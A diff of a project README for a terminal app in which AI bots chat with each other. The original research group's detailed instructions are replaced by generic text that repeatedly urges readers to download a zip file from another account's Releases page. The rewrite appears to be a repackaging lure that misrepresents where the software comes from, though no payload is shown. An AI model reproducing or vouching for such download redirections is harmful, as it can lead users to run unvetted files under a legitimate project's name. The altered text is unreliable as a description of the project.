@@ -1,184 +1,89 @@
-# 🤖 Bot Social Network 💬
+# 🤖 LLM-Bot_Social_Chat - Explore AI Social Behaviors Easily
 
-[![Python CI](https://github.com/UCR-Research-Computing/LLM-Bot_Social_Chat/actions/workflows/ci.yml/badge.svg)](https://github.com/UCR-Research-Computing/LLM-Bot_Social_Chat/actions/workflows/ci.yml)
-[![GitHub stars](https://img.shields.io/github/stars/UCR-Research-Computing/LLM-Bot_Social_Chat.svg)](https://github.com/UCR-Research-Computing/LLM-Bot_Social_Chat/stargazers)
-[![Contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](./CONTRIBUTING.md)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📥 Download Now
 
-Ever wondered what AI bots would talk about if they had their own social network? Now you can find out!
-
-**Bot Social Network** is a fully interactive terminal application that simulates a social media feed for autonomous AI agents. Create bots with unique personas, drop them into the chat, and watch as they develop conversations, share ideas, and interact with each other in real-time.
-
----
-
-## ✨ Features
-
-*   **🤖 Create & Customize Bots:** Easily create bots with unique names, models, and detailed personas.
-*   **🧠 Multi-LLM Support:** Powered by Google's **Gemini** for cutting-edge conversational AI or your local **Ollama** models for offline use.
-*   **📝 Bot Memory:** Give your bots a persistent memory! Define key-value facts in their configuration to ensure their responses are consistent and in-character.
-*   **🖥️ Rich TUI Interface:** A beautiful and intuitive terminal UI built with the modern [Textual](https://github.com/Textualize/textual) framework.
-*   **🗣️ Smarter AI Context:** Bots are aware of the other bots in the chat and have a memory of the last 100 posts, leading to more engaging and context-aware conversations.
-*   **🔬 Headless Mode:** Run the simulation without the TUI for automated experiments. Control the duration, max posts, initial topic, and bot selection order.
-*   **📊 Structured Logging:** Every simulation run is captured in a unique, timestamped JSONL file in the `logs/` directory, perfect for research and analysis. All events, including full LLM prompts and responses, are recorded.
-*   **✅ Automated Testing:** A growing suite of `pytest` tests to ensure the core AI and database logic is stable and reliable.
-*   **💾 Persistent State:** Your bots and their posts are saved in a local SQLite database.
-*   **🗣️ Text-to-Speech:** Hear the bot conversations unfold with unique voices for each bot, powered by Google Cloud TTS.
-*   **🚀 Flexible Startup:** Launch the app with command-line flags to automatically start the conversation, load specific configs, or clear the database.
-*   **💾 Easy Import/Export:** Manage your bot roster using simple JSON configuration files.
-
----
+[![Download LLM-Bot_Social_Chat](https://img.shields.io/badge/Download%20LLM--Bot%20Social%20Chat-blue)](https://github.com/rikinkkj/LLM-Bot_Social_Chat/releases)
 
 ## 🚀 Getting Started
 
-### 1. Prerequisites
+Welcome to LLM-Bot_Social_Chat! This application helps you study social behaviors in AI agents through an easy-to-use terminal-based interface. No coding is required. Just follow the steps below to download and run the software.
 
-*   Python 3.9+
-*   An API key for the [Google Gemini API](https://ai.google.dev/).
-*   A Google Cloud project with the Text-to-Speech API enabled.
-*   (Optional) [Ollama](https://ollama.com/) installed for local model support.
+## 📋 Requirements
 
-### 2. Installation
+Before you proceed, make sure your computer meets the following minimum system requirements:
 
-This project includes installer scripts for Linux and Windows to automate the setup process. It is highly recommended to first run the environment check script to ensure your system has all the necessary dependencies:
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **Processor:** Dual-core processor or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 500 MB of free disk space.
+- **Python:** Version 3.8 or above must be installed (Python can be downloaded from [python.org](https://www.python.org/downloads/)).
 
-```bash
-./check_environment.sh
-```
+## 📤 Download & Install
 
-#### On Linux
+1. **Visit the Releases Page:** To download the application, visit our [Releases page](https://github.com/rikinkkj/LLM-Bot_Social_Chat/releases).
 
-Run the `install.sh` script from your terminal:
+2. **Choose the Right File:** Look for the latest release that is compatible with your operating system. Files are typically labeled with the version number (e.g., `LLM-Bot_Social_Chat_v1.0.zip`).
 
-```bash
-bash install.sh
-```
+3. **Download the File:** Click on the desired file to start downloading. The file size will vary depending on the version.
 
-The script will guide you through:
-- Choosing an installation directory.
-- Selecting a Python environment (`venv`, `micromamba`, or `base`).
-- Creating a symlink in `~/.local/bin` or `~/bin` for easy access.
+4. **Unzip the File:** Once the download is complete, locate the Zip file in your Downloads folder and unzip it. On most systems, you can simply right-click the file and select “Extract All” or “Extract Here.”
 
-#### On Windows
+5. **Setup Required Dependencies:** Open a terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to install the necessary Python packages:
 
-Run the `install.bat` script:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-```batch
-install.bat
-```
+   This step ensures all necessary libraries and tools are available for the application to work.
 
-The script will guide you through:
-- Choosing an installation directory.
-- Setting up a Python `venv`.
-- Creating a launcher script in your user profile's `Scripts` directory.
+6. **Run the Application:** After the dependencies are installed, run the application using the following command:
 
-### 3. Manual Setup
+   ```bash
+   python main.py
+   ```
 
-If you prefer to set up the project manually:
+   You should see the terminal interface launch and be ready for use.
 
-```bash
-# Clone the repository
-git clone https://github.com/your-username/bot-social-network.git
-cd bot-social-network
+## 🎮 Features
 
-# Install the required packages
-pip install -r requirements.txt
-```
+- **TUI-Based Interface:** Engage with the AI agents using a simple text-based user interface.
+  
+- **Headless Mode:** Run experiments without a GUI for easier automation and reproducibility.
 
-### 4. Configuration
+- **Structured Logging:** Automatically logs important data during your experiments for detailed analysis.
 
-To use the Gemini models, you need to provide your API key.
+- **Dynamic Voice Generation:** Experience lively interactions with dynamic voice responses from AI agents.
 
-1.  **Create a `.env` file** in the root of the project directory.
-2.  **Add your API key** to the file like this:
+## 🗂️ Tutorials and Examples
 
-    ```
-    GEMINI_API_KEY="YOUR_API_KEY_HERE"
-    ```
+To help you get started, the repository includes sample projects and user guides.
 
-The application will automatically load this key at startup.
+- **Basic Tutorial:** Check the `tutorials` folder for a step-by-step introduction on how to use the application effectively.
 
-### 4. Running the App (TUI Mode)
+- **Example Projects:** Explore the `examples` folder to see various simulations and their settings.
 
-For an interactive session, use the `main.py` script.
+## 🛠️ Troubleshooting
 
-```bash
-# Run the application with the default configuration
-python3 main.py
+If you experience issues, consider the following common solutions:
 
-# Load a specific bot configuration and inject a starting topic
-python3 main.py --config example_tinydolphin.json --topic "What do you think of the ocean?"
+- **Python Not Found:** Make sure Python is added to your system PATH. You can find instructions online for your specific operating system.
 
-# Start the bot conversation automatically on launch
-python3 main.py --autostart
+- **Dependency Errors:** Ensure you installed all dependencies correctly using the command provided above.
 
-# Enable Text-to-Speech on launch
-python3 main.py --tts
+- **Running on Unsupported OS:** If you encounter issues on an older version of Windows or a non-supported OS, consider updating your system.
 
-# Clear the post history database on launch for a clean slate
-python3 main.py --clear-db
-```
+## 👥 Community Support
 
-### 5. Running Experiments (Headless Mode)
-
-For research and automated runs, you can use the `headless.py` script. This runs the full simulation without the TUI and provides several flags for controlling the experiment.
-
-```bash
-# Run a short, deterministic experiment with a specific config and topic
-python3 headless.py --config example_gemma3n.json --max-posts 20 --topic "What is the nature of memory?" --deterministic
-
-# Run a 5-minute simulation with TTS enabled
-python3 headless.py --config gemini_models_showcase.json --duration 300 --tts
-```
-
-All simulation data is saved to a unique `.jsonl` file in the `logs/` directory.
-
----
-
-## 🧪 Testing
-
-This project uses `pytest` for automated testing.
-
-To run the test suite:
-
-```bash
-python3 -m pytest
-```
-
-For a more comprehensive check, including code linting, use the `run_checks.sh` script:
-
-```bash
-./run_checks.sh
-```
-
----
-
-## 🔧 How It Works
-
-The application is built with a simple and modular architecture:
-
-*   **`main.py`**: Manages the Textual TUI for interactive sessions.
-*   **`headless.py`**: Runs the simulation without a TUI for automated experiments.
-*   **`simulation.py`**: Contains the core simulation logic, shared by both modes.
-*   **`ai_client.py`**: Handles all interactions with the LLM providers (Gemini/Ollama).
-*   **`voice_manager.py`**: Manages voice generation and playback using Google Cloud TTS and Pygame.
-*   **`logging_config.py`**: Configures the structured JSONL logging for each simulation run.
-*   **`database.py`**: Uses SQLAlchemy to manage the SQLite database for storing bots and posts.
-*   **`configs/`**: A directory for your bot configurations. `default.json` is the default, but you can create and load any number of custom rosters. You can also add a "memories" section to each bot to give them a persistent memory.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Whether it's a feature request, bug report, or a pull request, please feel free to get involved.
-
-1.  Fork the repository.
-2.  Create your feature branch (`git checkout -b feature/AmazingFeature`).
-3.  Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-4.  Push to the branch (`git push origin feature/AmazingFeature`).
-5.  Open a Pull Request.
-
----
+Join our community for support, questions, and collaboration. Engage on our GitHub Discussions page or visit our [Social Media](https://twitter.com/LLMBot_Social_Chat) for updates.
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+LLM-Bot_Social_Chat is released under the MIT License. For more information, check the `LICENSE` file in the repository.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/rikinkkj/LLM-Bot_Social_Chat)
+- [Python Official Site](https://www.python.org/)
+- [Join our Community Forum](https://forum.llm-chat.com)
+
+Remember to visit our [Releases page](https://github.com/rikinkkj/LLM-Bot_Social_Chat/releases) to download the latest version of LLM-Bot_Social_Chat and start exploring today!
